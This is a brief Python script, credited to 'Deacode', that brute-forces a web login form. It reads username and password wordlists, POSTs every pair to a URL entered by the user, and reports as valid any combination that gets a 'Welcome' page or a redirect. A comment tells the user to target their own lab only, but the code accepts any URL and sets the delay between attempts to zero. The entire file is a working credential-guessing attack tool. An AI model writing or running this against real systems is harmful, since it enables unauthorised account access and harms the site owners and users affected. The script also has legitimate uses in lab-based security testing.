# Made by Deacode
import requests
import time

# Target (YOUR OWN LAB ONLY!)
url = input("URL: ")

# Read usernames
with open("usernames.txt", "r") as f:
    usernames = [line.strip() for line in f if line.strip()]

# Read passwords
with open("passwords.txt", "r") as f:
    passwords = [line.strip() for line in f if line.strip()]

found = False

for username in usernames:
    print(f"\n[*] Testing username: {username}")

    for password in passwords:
        data = {
            "username": username,
            "password": password
        }

        try:
            response = requests.post(url, data=data, timeout=10)

            # Adjust this check for your lab application
            if "Welcome" in response.text or response.status_code == 302:
                print(f"\n[+] VALID CREDENTIALS FOUND!")
                print(f"    Username: {username}")
                print(f"    Password: {password}")
                found = True
                break
            else:
                print(f"[-] {username}:{password}")

        except requests.RequestException as e:
            print(f"[!] Request failed: {e}")

        # Slow down requests
        time.sleep(0) # Optional

    if found:
        break

if not found:
    print("\n[!] No valid credentials found.")
